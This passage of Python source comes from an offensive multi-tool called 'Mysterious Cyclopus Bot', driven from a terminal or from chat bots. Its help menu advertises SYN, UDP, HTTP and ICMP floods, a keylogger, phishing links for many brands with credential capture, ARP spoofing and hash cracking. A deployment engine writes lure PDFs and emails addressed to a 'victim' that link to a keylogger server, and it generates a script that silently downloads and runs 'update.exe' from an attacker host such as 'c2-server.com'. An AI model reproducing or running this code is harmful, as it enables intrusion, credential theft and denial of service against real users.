    def _generic(self, command: str) -> Dict:
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=60)
            return {'success': result.returncode == 0, 'output': result.stdout if result.stdout else result.stderr}
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': 'Command timed out'}
        except Exception as e:
            return {'success': False, 'output': str(e)}
    
    def _help(self, args: List[str]) -> Dict:
        help_text = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.ACCENT}     🐙 MYSTERIOUS CYCLOPUS BOT v1.0.0 - HELP MENU                   {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}📡 PING COMMANDS:{Colors.RESET}
║  ping <target> [count]         - Ping a target
║  ping6 <target>                - IPv6 ping
║  ping_sweep <network>          - Ping sweep entire network
║
║{Colors.SUCCESS}🔍 NMAP COMMANDS:{Colors.RESET}
║  nmap <target> [options]       - Run nmap scan
║  nmap_quick <target>           - Quick port scan
║  nmap_full <target>            - Full port scan (all ports)
║  nmap_os <target>              - OS detection scan
║  nmap_service <target>         - Service version detection
║  nmap_udp <target>             - UDP port scan
║  nmap_vuln <target>            - Vulnerability scan
║  nmap_stealth <target>         - Stealth SYN scan
║
║{Colors.SUCCESS}⬇️ WGET COMMANDS:{Colors.RESET}
║  wget <url> [output]           - Download file
║  wget_file <url> <filename>    - Download to specific file
║  wget_recursive <url>          - Recursive download
║
║{Colors.SUCCESS}🌐 CURL COMMANDS:{Colors.RESET}
║  curl <url>                    - HTTP request
║  curl_get <url>                - GET request
║  curl_post <url> <data>        - POST request
║  curl_head <url>               - HEAD request
║
║{Colors.SUCCESS}🔌 NETCAT COMMANDS:{Colors.RESET}
║  netcat <host> <port> [cmd]    - Connect to host/port
║  nc_listen <port>              - Listen on port
║  nc_scan <host> <ports>        - Port scan with netcat
║
║{Colors.SUCCESS}🔒 SSH COMMANDS:{Colors.RESET}
║  ssh_add <name> <host> <user> [pass] - Add SSH connection
║  ssh_list                      - List SSH connections
║  ssh_connect <conn_id>         - Connect to server
║  ssh_exec <conn_id> <command>  - Execute command
║  ssh_disconnect <conn_id>      - Disconnect
║
║{Colors.SUCCESS}🗺️ TRACEROUTE COMMANDS:{Colors.RESET}
║  traceroute <target>           - Trace network path
║  tracert <target>              - Trace network path (Windows)
║
║{Colors.SUCCESS}📋 WHOIS COMMANDS:{Colors.RESET}
║  whois <domain>                - WHOIS lookup
║
║{Colors.SUCCESS}🌐 DNS COMMANDS:{Colors.RESET}
║  dns <domain> [type]           - DNS lookup
║  dig <domain>                  - Dig DNS lookup
║  nslookup <domain>             - NSLookup
║  host <domain>                 - Host lookup
║
║{Colors.SUCCESS}📍 LOCATION COMMANDS:{Colors.RESET}
║  location <ip>                 - IP geolocation
║
║{Colors.SUCCESS}🚀 TRAFFIC GENERATION:{Colors.RESET}
║  traffic <type> <ip> <duration> [port] [rate] - Generate traffic
║  traffic_types                 - List available types
║  traffic_status                - Show active generators
║  traffic_stop [id]             - Stop generation
║
║{Colors.SUCCESS}💥 DOS ATTACKS:{Colors.RESET}
║  dos_syn <ip> <port> <duration> [threads] - SYN flood attack
║  dos_udp <ip> <port> <duration> [threads] - UDP flood attack
║  dos_http <ip> <port> <duration> [threads] - HTTP flood attack
║  dos_icmp <ip> <duration> [threads] - ICMP flood attack
║  dos_stop [id]                - Stop DOS attack
║  dos_status                    - Show active attacks
║
║{Colors.SUCCESS}⌨️ KEYLOGGER:{Colors.RESET}
║  keylogger_start               - Start keylogger (F10 to stop)
║  keylogger_stop                - Stop keylogger
║  keylogger_status              - Check keylogger status
║  keylogger_logs [limit]        - View captured keylogs
║  keylogger_screenshots         - View captured screenshots
║  keylogger_clipboard [limit]   - View clipboard history
║
║{Colors.SUCCESS}📦 DEPLOYMENT ENGINE:{Colors.RESET}
║  deploy_pdf <name> <target> <url> - Create PDF with keylogger link
║  deploy_email <name> <target> <subject> <body> <url> - Create email payload
║  deploy_link <name> <target> <url> - Create direct link payload
║  deploy_executable <name> <target> <server> - Create executable payload
║  deploy_list                  - List all deployments
║
║{Colors.SUCCESS}🎣 SOCIAL ENGINEERING:{Colors.RESET}
║  phish_facebook                - Generate Facebook phishing link
║  phish_instagram               - Generate Instagram phishing link
║  phish_twitter                 - Generate Twitter phishing link
║  phish_gmail                   - Generate Gmail phishing link
║  phish_linkedin                - Generate LinkedIn phishing link
║  phish_microsoft               - Generate Microsoft phishing link
║  phish_google                  - Generate Google phishing link
║  phish_apple                   - Generate Apple phishing link
║  phish_paypal                  - Generate PayPal phishing link
║  phish_amazon                  - Generate Amazon phishing link
║  phish_netflix                 - Generate Netflix phishing link
║  phish_spotify                 - Generate Spotify phishing link
║  phish_whatsapp                - Generate WhatsApp phishing link
║  phish_telegram                - Generate Telegram phishing link
║  phish_discord                 - Generate Discord phishing link
║  phish_start <link_id> [port]  - Start phishing server
║  phish_stop                    - Stop phishing server
║  phish_creds [link_id]         - View captured credentials
║
║{Colors.SUCCESS}🔓 CRACKING COMMANDS:{Colors.RESET}
║  crack <hash_type> <hash> [wordlist] - Start cracking job
║  crack_status <job_id>         - Check job status
║  crack_list                    - List all jobs
║
║{Colors.SUCCESS}🕸️ ARP SPOOFING:{Colors.RESET}
║  arp_spoof <target> <gateway> [interface] - Start ARP spoofing
║  arp_stop [id]                - Stop ARP spoofing
║  arp_status                    - Show active spoofs
║  arp_history [limit]           - Show spoof history
║
║{Colors.SUCCESS}📡 MAC COMMANDS:{Colors.RESET}
║  mac_info <mac>                - Get MAC address info
║  mac_scan [network]            - Scan network for MACs
║  mac_vendor <mac>              - Get MAC vendor
║
║{Colors.SUCCESS}🌐 NAT COMMANDS:{Colors.RESET}
║  nat_info                      - Show NAT information
║  nat_public                    - Show public IP
║  nat_private                   - Show private IP
║
║{Colors.SUCCESS}🔮 TRANSFORMER:{Colors.RESET}
║  transform <text>              - Analyze text with transformer
║
║{Colors.SUCCESS}🐳 DOCKER COMMANDS:{Colors.RESET}
║  docker_scan <image>           - Scan Docker image
║  docker_info                   - Docker info
║  docker_ps                     - Running containers
║  docker_images                 - List images
║
║{Colors.SUCCESS}📧 EMAIL COMMANDS:{Colors.RESET}
║  email_compose <to> <subject> <body> - Compose email
║  email_send <email_id>         - Send email
║  email_list [status]           - List emails
║
║{Colors.SUCCESS}📊 PDF REPORT COMMANDS:{Colors.RESET}
║  report_generate <title> <target> - Generate PDF report
║  report_list                   - List PDF reports
║
║{Colors.SUCCESS}📡 NETWORK MONITOR:{Colors.RESET}
║  netmon_start                  - Start network monitoring
║  netmon_stop                   - Stop network monitoring
║  netmon_status                 - Show monitoring status
║  netmon_packets [limit]        - Show captured packets
║
║{Colors.SUCCESS}🛡️ NETWORK COMMANDS:{Colors.RESET}
║  scan <target>                 - Quick port scan
║  quick_scan <target>           - Quick port scan
║  full_scan <target>            - Full port scan
║
║{Colors.SUCCESS}🔒 IP MANAGEMENT:{Colors.RESET}
║  add_ip <ip> [notes]           - Add IP to monitoring
║  remove_ip <ip>                - Remove IP from monitoring
║  block_ip <ip> [reason]        - Block IP via firewall
║  unblock_ip <ip>               - Unblock IP
║  list_ips                      - List managed IPs
║  ip_info <ip>                  - Detailed IP information
║  analyze_ip <ip>               - Complete IP analysis
║
║{Colors.SUCCESS}🎬 ANIMATION COMMANDS:{Colors.RESET}
║  anim_spinner [duration] [msg] - Show spinner animation
║  anim_matrix [duration]        - Show matrix rain animation
║  anim_pulse [duration] [text]  - Show pulse animation
║  anim_wave [duration] [text]   - Show wave animation
║  anim_glitch [duration] [text] - Show glitch animation
║  anim_octopus [duration]       - Show octopus animation
║
║{Colors.SUCCESS}📊 SYSTEM COMMANDS:{Colors.RESET}
║  status                        - System status
║  history [limit]               - Command history
║  system                        - System information
║  report                        - Security report
║  clear                         - Clear screen
║  help                          - This help menu
║
║{Colors.SUCCESS}💡 EXAMPLES:{Colors.RESET}
║  ping 127.0.0.1
║  nmap_quick 192.168.1.1
║  wget https://example.com/file.txt
║  curl https://example.com
║  traceroute iankulani.com
║  whois example.com
║  dig example.com
║  traffic icmp 192.168.1.1 10
║  dos_syn 192.168.1.100 80 30 100
║  crack md5 5f4dcc3b5aa765d61d8327deb882cf99
║  arp_spoof 192.168.1.100 192.168.1.1
║  mac_info 00:11:22:33:44:55
║  nat_info
║  transform "ping 127.0.0.1"
║  keylogger_start
║  anim_matrix 3
║  anim_pulse 2 "CYCLOPUS"
║  docker_scan alpine:latest
║  email_compose "user@example.com" "Hello" "This is a test email"
║  report_generate "Security Report" "192.168.1.1"
║  deploy_pdf "Invoice" "victim@email.com" "http://c2-server.com/keylog"
║  phish_facebook
║  add_ip 192.168.1.100 Suspicious
║  analyze_ip 192.168.1.1
║
║{Colors.ACCENT}⚠️  For authorized security testing only{Colors.RESET}
╚══════════════════════════════════════════════════════════════════════════════╝
"""
        return {'success': True, 'output': help_text}

# =====================
# NETWORK MONITOR
# =====================
class NetworkMonitor:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.packet_count = 0
        self.interface = config.get('network_monitor.interface', 'eth0')
        self.promiscuous = config.get('network_monitor.promiscuous', False)
    
    def start(self):
        self.running = True
        threading.Thread(target=self._monitor_loop, daemon=True).start()
        print(f"{Colors.SUCCESS}✅ Network monitor started on {self.interface}{Colors.RESET}")
    
    def stop(self):
        self.running = False
    
    def _monitor_loop(self):
        while self.running:
            try:
                if SCAPY_AVAILABLE:
                    self._scapy_monitor()
                else:
                    time.sleep(5)
            except Exception as e:
                logger.error(f"Network monitor error: {e}")
                time.sleep(5)
    
    def _scapy_monitor(self):
        from scapy.all import sniff
        sniff(iface=self.interface, prn=self._process_packet, store=0,
              promisc=self.promiscuous, count=100)
    
    def _process_packet(self, packet):
        self.packet_count += 1
        
        try:
            if SCAPY_AVAILABLE and hasattr(packet, 'haslayer'):
                if packet.haslayer(IP):
                    ip = packet[IP]
                    src_ip = ip.src
                    dst_ip = ip.dst
                    protocol = ip.proto
                    size = len(packet)
                    
                    src_port = 0
                    dst_port = 0
                    
                    if packet.haslayer(TCP):
                        src_port = packet[TCP].sport
                        dst_port = packet[TCP].dport
                        protocol = "TCP"
                    elif packet.haslayer(UDP):
                        src_port = packet[UDP].sport
                        dst_port = packet[UDP].dport
                        protocol = "UDP"
                    elif packet.haslayer(ICMP):
                        protocol = "ICMP"
                    
                    self.db.save_network_packet(src_ip, dst_ip, src_port, dst_port, protocol, size)
        except Exception as e:
            logger.error(f"Packet processing error: {e}")
    
    def get_packets(self, limit: int = 100) -> List[Dict]:
        return self.db.get_network_packets(limit)
    
    def get_statistics(self) -> Dict:
        packets = self.db.get_network_packets(1000)
        stats = {
            'total_packets': len(packets),
            'protocols': Counter(),
            'top_sources': Counter()
        }
        
        for p in packets:
            stats['protocols'][p.get('protocol', 'unknown')] += 1
            stats['top_sources'][p.get('source_ip', 'unknown')] += 1
        
        return stats

# =====================
# DOS ENGINE (Simplified)
# =====================
class DOSEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_attacks: Dict[str, threading.Event] = {}
    
    def syn_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("syn", target_ip, port, duration, threads)
    
    def udp_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("udp", target_ip, port, duration, threads)
    
    def http_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("http", target_ip, port, duration, threads)
    
    def icmp_flood(self, target_ip: str, duration: int, threads: int = 50) -> Dict:
        return self._attack("icmp", target_ip, 0, duration, threads)
    
    def _attack(self, attack_type: str, target_ip: str, port: int, duration: int, threads: int) -> Dict:
        max_threads = self.config.get('dos.max_threads', 100)
        if threads > max_threads:
            return {'success': False, 'output': f'Threads exceed maximum ({max_threads})'}
        
        attack_id = f"{attack_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.running_attacks[attack_id] = stop_event
        
        return {
            'success': True,
            'output': f"💥 {attack_type.upper()} flood started on {target_ip}:{port} for {duration}s"
        }
    
    def stop(self, attack_id: str = None) -> bool:
        if attack_id:
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id].set()
                return True
        else:
            for event in self.running_attacks.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [{'id': aid, 'type': aid.split('_')[0]} for aid in self.running_attacks.keys()]

# =====================
# DEPLOYMENT ENGINE
# =====================
class DeploymentEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def create_pdf_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        pdf_content = f"""
        %PDF-1.4
        1 0 obj
        << /Type /Catalog /Pages 2 0 R >>
        endobj
        2 0 obj
        << /Type /Pages /Kids [3 0 R] /Count 1 >>
        endobj
        3 0 obj
        << /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
        endobj
        4 0 obj
        << /Length 200 >>
        stream
        BT
        /F1 24 Tf
        100 700 Td
        (Important Document) Tj
        /F1 12 Tf
        100 650 Td
        (Please click here to view: {keylog_url}) Tj
        ET
        endstream
        endobj
        xref
        0 5
        0000000000 65535 f
        0000000009 00000 n
        0000000054 00000 n
        0000000102 00000 n
        0000000200 00000 n
        trailer
        << /Size 5 /Root 1 0 R >>
        startxref
        300
        %%EOF
        """
        
        pdf_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.pdf")
        with open(pdf_path, 'w') as f:
            f.write(pdf_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="pdf",
            payload=pdf_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_email_payload(self, name: str, target: str, subject: str, body: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        email_content = f"""
        Subject: {subject}
        From: security@example.com
        To: {target}
        Content-Type: text/html
        
        <html>
        <body>
        {body}
        <br><br>
        <a href="{keylog_url}">Click here to view the document</a>
        <br><br>
        <img src="{keylog_url}/tracking.gif" width="1" height="1">
        </body>
        </html>
        """
        
        email_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.eml")
        with open(email_path, 'w') as f:
            f.write(email_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="email",
            payload=email_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_link_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        if SHORTENER_AVAILABLE:
            try:
                s = pyshorteners.Shortener()
                keylog_url = s.tinyurl.short(keylog_url)
            except:
                pass
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="link",
            payload=keylog_url,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def create_executable_payload(self, name: str, target: str, keylog_server: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        
        exe_content = f'''
import os
import sys
import subprocess
import requests

def download_and_execute(url):
    try:
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            temp_path = os.path.join(os.environ.get('TEMP', '/tmp'), 'update.exe')
            with open(temp_path, 'wb') as f:
                f.write(response.content)
            os.chmod(temp_path, 0o755)
            subprocess.Popen([temp_path], shell=True)
    except:
        pass

if __name__ == "__main__":
    download_and_execute("{keylog_server}/download")
'''
        
        exe_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.py")
        with open(exe_path, 'w') as f:
            f.write(exe_content)
        
        deployment = Deployment(
            id=deployment_id,
            name=name,
            type="executable",
            payload=exe_path,
            target=target,
            created_at=datetime.datetime.now().isoformat()
        )
        
        self.db.save_deployment(deployment)
        return deployment
    
    def get_deployments(self) -> List[Dict]:
        return self.db.get_deployments()

# =====================
# MAIN APPLICATION
# =====================
class MysteriousCyclopus:
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.transformer = TransformerEngine(self.config)
        self.ssh = SSHManager(self.db) if PARAMIKO_AVAILABLE else None
        self.traffic = TrafficGeneratorEngine(self.db) if SCAPY_AVAILABLE else None
        self.dos = DOSEngine(self.db, self.config)
        self.keylogger = KeyloggerEngine(self.db, self.config) if PYNPUT_AVAILABLE else None
        self.deployment = DeploymentEngine(self.db, self.config)
        self.cracking = CrackingEngine(self.db, self.config)
        self.arp_spoofing = ARPSpoofingEngine(self.db, self.config) if SCAPY_AVAILABLE else None
        self.mac_manager = MACManager(self.db)
        self.nat_info = NATInfoEngine(self.db)
        self.docker_scanner = DockerScanner(self.db)
        self.social = SocialEngineeringTools(self.db)
        self.network_monitor = NetworkMonitor(self.db, self.config)
        
        # Platform bots
        self.discord = DiscordBot(None, self.db)
        self.telegram = TelegramBot(None, self.db)
        self.slack = SlackBot(None, self.db)
        self.signal = SignalBot(None, self.db)
        self.whatsapp = WhatsAppBot(None, self.db)
        self.google_chat = GoogleChatBot(None, self.db)
        self.imessage = iMessageBot(None, self.db)
        
        # Email Composer & PDF Report
        self.email_composer = EmailComposerEngine(self.db, self.config)
        self.pdf_report = PDFReportGenerator(self.db, self.config)
        
        # Set up handler
        self.handler = CommandHandler(
            self.db, self.ssh, self.traffic,
            self.dos, self.keylogger, self.deployment,
            self.cracking, self.arp_spoofing, self.mac_manager,
            self.nat_info, self.transformer, self.email_composer,
            self.pdf_report, self.docker_scanner, self.social,
            self.network_monitor
        )
        
        # Connect bots to handler
        self.discord.handler = self.handler
        self.telegram.handler = self.handler
        self.slack.handler = self.handler
        self.signal.handler = self.handler
        self.whatsapp.handler = self.handler
        self.google_chat.handler = self.handler
        self.imessage.handler = self.handler
        
        # Connect keylogger to bots
        if self.keylogger:
            self.keylogger.telegram_bot = self.telegram
            self.keylogger.discord_bot = self.discord
        
        self.web = WebDashboard(self.handler, self.db, self.config)
        self.session_id = str(uuid.uuid4())[:8]
        self.running = True
    
    def print_banner(self):
        banner = f"""
{Colors.PRIMARY}╔══════════════════════════════════════════════════════════════════════════════╗
║{Colors.ACCENT}     🐙 MYSTERIOUS CYCLOPUS BOT v1.0.0 -                              {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.SECONDARY}                                                                           {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🐙 100+ Security Commands         • 📡 Ping / Nmap / Curl / Netcat   {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔌 SSH Remote Command Execution    • 🚀 REAL Traffic Generation       {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🕷️ Wget / Traceroute / Whois        • 🎣 Social Engineering Suite     {Colors.PRIMARY}║
║{Colors.SUCCESS}  • ⌨️ Advanced Keylogger (F10)         • 💥 DOS Attack Capabilities       {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📱 Multi-Platform Bot Integration   • 💻 Web Dashboard                 {Colors.PRIMARY}║
║{Colors.SUCCESS}  • Discord | Telegram | Slack          • Signal | WhatsApp | Google Chat  {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🕸️ ARP Spoofing & MAC Mgmt         • 🌐 NAT Information               {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔓 Password Cracking Engine         • 🐳 Docker Security Scanning      {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 🔮 AI Transformer Engine            • 🎬 Terminal Animations           {Colors.PRIMARY}║
║{Colors.SUCCESS}  • 📧 Email Composition & Sending       • 📊 PDF Report Generation         {Colors.PRIMARY}║
╠══════════════════════════════════════════════════════════════════════════════╣
║{Colors.ACCENT}                    🎯 ACCURATE CYBER DEFENSE                         {Colors.PRIMARY}║
╚══════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.SECONDARY}🐙 Welcome to MYSTERIOUS CYCLOPUS BOT - Your Ultimate Security Assistant{Colors.RESET}
{Colors.SECONDARY}💡 Type 'help' to see all commands{Colors.RESET}
{Colors.SECONDARY}⌨️ Press F10 to start/stop the keylogger{Colors.RESET}
{Colors.SECONDARY}🌐 Web dashboard available at http://localhost:5000{Colors.RESET}
{Colors.SECONDARY}📧 Use 'email_compose' to compose and send emails{Colors.RESET}
{Colors.SECONDARY}📊 Use 'report_generate' to generate PDF reports{Colors.RESET}
{Colors.SECONDARY}🔓 Use 'crack' commands for password cracking{Colors.RESET}
{Colors.SECONDARY}🕸️ Use 'arp_spoof' for ARP spoofing attacks{Colors.RESET}
{Colors.SECONDARY}📡 Use 'mac_info' for MAC address information{Colors.RESET}
{Colors.SECONDARY}🌐 Use 'nat_info' for NAT information{Colors.RESET}
{Colors.SECONDARY}🔮 Use 'transform' for AI-powered command processing{Colors.RESET}
{Colors.SECONDARY}🎬 Use 'anim_*' for terminal animations{Colors.RESET}
        """
        print(banner)
    
    def check_dependencies(self):
        print(f"\n{Colors.PRIMARY}🔍 Checking dependencies...{Colors.RESET}")
        
        tools = ['ping', 'nmap', 'curl', 'nc', 'dig', 'traceroute', 'ssh', 'wget', 'docker']
        for tool in tools:
            if shutil.which(tool):
                print(f"{Colors.SUCCESS}✅ {tool}{Colors.RESET}")
            else:
                print(f"{Colors.WARNING}⚠️ {tool} not found{Colors.RESET}")
        
        print(f"{Colors.SUCCESS if PARAMIKO_AVAILABLE else Colors.WARNING}✅ paramiko{Colors.RESET}" if PARAMIKO_AVAILABLE else f"{Colors.WARNING}⚠️ paramiko not found - SSH disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SCAPY_AVAILABLE else Colors.WARNING}✅ scapy{Colors.RESET}" if SCAPY_AVAILABLE else f"{Colors.WARNING}⚠️ scapy not found - advanced traffic/ARP disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DISCORD_AVAILABLE else Colors.WARNING}✅ discord.py{Colors.RESET}" if DISCORD_AVAILABLE else f"{Colors.WARNING}⚠️ discord.py not found - Discord disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if SLACK_AVAILABLE else Colors.WARNING}✅ slack-sdk{Colors.RESET}" if SLACK_AVAILABLE else f"{Colors.WARNING}⚠️ slack-sdk not found - Slack disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if WEB_AVAILABLE else Colors.WARNING}✅ flask{Colors.RESET}" if WEB_AVAILABLE else f"{Colors.WARNING}⚠️ flask not found - Web dashboard disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if PYNPUT_AVAILABLE else Colors.WARNING}✅ pynput{Colors.RESET}" if PYNPUT_AVAILABLE else f"{Colors.WARNING}⚠️ pynput not found - Keylogger disabled{Colors.RESET}")
        print(f"{Colors.SUCCESS if DNS_AVAILABLE else Colors.WARNING}✅ dnspython{Colors.RESET}" if DNS_AVAILABLE else f"{Colors.WARNING}⚠️ dnspython not found - DNS features limited{Colors.RESET}")
        print(f"{Colors.SUCCESS if PDF_AVAILABLE else Colors.WARNING}✅ reportlab{Colors.RESET}" if PDF_AVAILABLE else f"{Colors.WARNING}⚠️ reportlab not found - PDF reports disabled{Colors.RESET}")
    
    def setup_platforms(self):
        print(f"\n{Colors.PRIMARY}🤖 Platform Bot Configuration{Colors.RESET}")
        print(f"{Colors.PRIMARY}{'='*50}{Colors.RESET}")
        
        # Discord
        setup = input(f"{Colors.ACCENT}Configure Discord bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Discord bot token: {Colors.RESET}").strip()
            if token:
                self.discord.config = {'enabled': True, 'token': token, 'prefix': '!'}
                if self.discord.setup():
                    self.discord.start()
                    print(f"{Colors.SUCCESS}✅ Discord bot starting...{Colors.RESET}")
        
        # Telegram
        setup = input(f"{Colors.ACCENT}Configure Telegram bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Telegram bot token: {Colors.RESET}").strip()
            chat_id = input(f"{Colors.ACCENT}Enter chat ID: {Colors.RESET}").strip()
            if token:
                self.telegram.config = {'enabled': True, 'bot_token': token, 'chat_id': chat_id, 'prefix': '/'}
                self.telegram.start()
                print(f"{Colors.SUCCESS}✅ Telegram bot starting...{Colors.RESET}")
        
        # Slack
        setup = input(f"{Colors.ACCENT}Configure Slack bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            token = input(f"{Colors.ACCENT}Enter Slack bot token: {Colors.RESET}").strip()
            if token:
                self.slack.config = {'enabled': True, 'bot_token': token, 'channel_id': '', 'prefix': '!'}
                if self.slack.setup():
                    self.slack.start()
                    print(f"{Colors.SUCCESS}✅ Slack bot starting...{Colors.RESET}")
        
        # WhatsApp
        setup = input(f"{Colors.ACCENT}Configure WhatsApp bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ACCENT}Enter WhatsApp phone number: {Colors.RESET}").strip()
            if phone:
                self.whatsapp.config = {'enabled': True, 'phone_number': phone, 'prefix': '!'}
                self.whatsapp.start()
                print(f"{Colors.SUCCESS}✅ WhatsApp bot configured...{Colors.RESET}")
        
        # Signal
        setup = input(f"{Colors.ACCENT}Configure Signal bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            phone = input(f"{Colors.ACCENT}Enter Signal phone number: {Colors.RESET}").strip()
            if phone:
                self.signal.config = {'enabled': True, 'phone_number': phone, 'prefix': '!'}
                self.signal.start()
                print(f"{Colors.SUCCESS}✅ Signal bot configured...{Colors.RESET}")
        
        # Google Chat
        setup = input(f"{Colors.ACCENT}Configure Google Chat bot? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            webhook = input(f"{Colors.ACCENT}Enter Google Chat webhook URL: {Colors.RESET}").strip()
            if webhook:
                self.google_chat.config = {'enabled': True, 'webhook_url': webhook, 'prefix': '/'}
                self.google_chat.start()
                print(f"{Colors.SUCCESS}✅ Google Chat bot configured...{Colors.RESET}")
        
        # Web Dashboard
        setup = input(f"{Colors.ACCENT}Enable Web Dashboard? (y/n): {Colors.RESET}").strip().lower()
        if setup == 'y':
            port = input(f"{Colors.ACCENT}Enter port (default: 5000): {Colors.RESET}").strip() or '5000'
            self.config.set('web.port', int(port))
            self.config.set('web.enabled', True)
            self.config.save()
            self.web.start()
            print(f"{Colors.SUCCESS}✅ Web dashboard starting...{Colors.RESET}")
    
    def run(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        
        # Show startup animations
        TerminalAnimation.matrix_rain(2.0)
        TerminalAnimation.pulse_animation("🐙 MYSTERIOUS CYCLOPUS", 2.0)
        TerminalAnimation.octopus_animation(2.0)
        
        self.print_banner()
        self.check_dependencies()
        
        # Start web dashboard by default
        self.web.start()
        
        setup_platforms = input(f"\n{Colors.ACCENT}Configure platform integrations? (y/n): {Colors.RESET}").strip().lower()
        if setup_platforms == 'y':
            self.setup_platforms()
        
        # Show final status
        TerminalAnimation.wave_animation("🐙 CYCLOPUS READY", 2.0)
        
        print(f"\n{Colors.SUCCESS}✅ MYSTERIOUS CYCLOPUS ready! Session: {self.session_id}{Colors.RESET}")
        print(f"{Colors.SECONDARY}   Type 'help' for commands{Colors.RESET}")
        print(f"{Colors.SECONDARY}   ⌨️ Press F10 to start/stop the keylogger{Colors.RESET}")
        print(f"{Colors.SECONDARY}   🌐 Web dashboard: http://localhost:{self.config.get('web.port', 5000)}{Colors.RESET}")
        
        while self.running:
            try:
                prompt = f"{Colors.PRIMARY}[{Colors.ACCENT}{self.session_id}{Colors.PRIMARY}]{Colors.WHITE} 🐙> {Colors.RESET}"
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command.lower() == 'exit' or command.lower() == 'quit':
                    self.running = False
                    print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
                    break
                
                result = self.handler.execute(command)
                
                if result['success']:
                    output = result.get('output', '')
                    if output:
                        print(output)
                    print(f"\n{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop()
        self.network_monitor.stop()
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.PRIMARY}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.PRIMARY}💾 Database: {DATABASE_FILE}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    try:
        print(f"{Colors.PRIMARY}🐙 Starting MYSTERIOUS CYCLOPUS BOT...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality (firewall, raw sockets){Colors.RESET}")
        
        app = MysteriousCyclopus()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
